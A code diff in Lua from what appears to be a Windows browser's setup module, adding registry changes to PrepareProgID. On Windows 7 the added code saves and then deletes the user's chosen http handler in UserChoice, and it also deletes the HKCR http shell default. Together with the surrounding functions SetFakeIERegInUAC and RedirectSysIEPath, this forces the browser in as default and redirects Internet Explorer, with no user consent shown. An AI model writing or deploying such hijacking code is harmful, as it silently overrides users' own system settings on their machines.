@@ -277,6 +277,9 @@ end
 function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig")
+	--FunctionObj.TipLog("[TrySetDefaultBrowser] enter")
+	
+	--DoSetDefaultBrowser()
 	
 	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
 	if type(tDefaultBrowser) ~= "table" or type(tUserConfig) ~= "table" then
@@ -400,12 +403,22 @@ function RedirectSysIEPath()
 	FunctionObj.RegSetValue(strIERegPath, strCommand, true)
 end
 
+function IsWin7()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local sysVersion = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentVersion")
+	
+	if tonumber(sysVersion) and tonumber(sysVersion) > 6.0 and tonumber(sysVersion) < 6.2 then	
+		return true
+	end
+	return false
+end
 
 -- 准备progid
 function PrepareProgID(strProgID)
 	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
 	local bInfMode = true
 	local bIs64 = tFunHelper.CheckIs64OS()
+	tFunHelper.TipLog("PrepareProgID(strProgID)")
 	
 	local strBrowserPath = tFunHelper.GetExePath()
 	local strBrowPathWithFix = "\""..strBrowserPath.."\""
@@ -441,6 +454,17 @@ function PrepareProgID(strProgID)
 		end
 	end
 	
+	if IsWin7() then
+		local userChoiceReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
+		local userChoice = tFunHelper.RegQueryValue(userChoiceReg)
+		if userChoice then
+			tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
+		end
+		tFunHelper.DelRegValueInUAC("HKEY_CURRENT_USER", "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "Progid")
+	end
+	
+	tFunHelper.DelRegValueInUAC("HKEY_CLASSES_ROOT", "http\\shell", "")
+	
 	local bIs64 = tFunHelper.CheckIs64OS()
 	tFunHelper.CommitRegOperation(bIs64)
 	
@@ -461,6 +485,7 @@ end
 function SetFakeIERegInUAC(strCommand)
 	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
 	local strProgID = "IEHTML"
+	tFunHelper.TipLog("SetFakeIERegInUAC(strProgID)")
 	
 	local bSuccess = PrepareProgID(strProgID)
 	if not bSuccess then
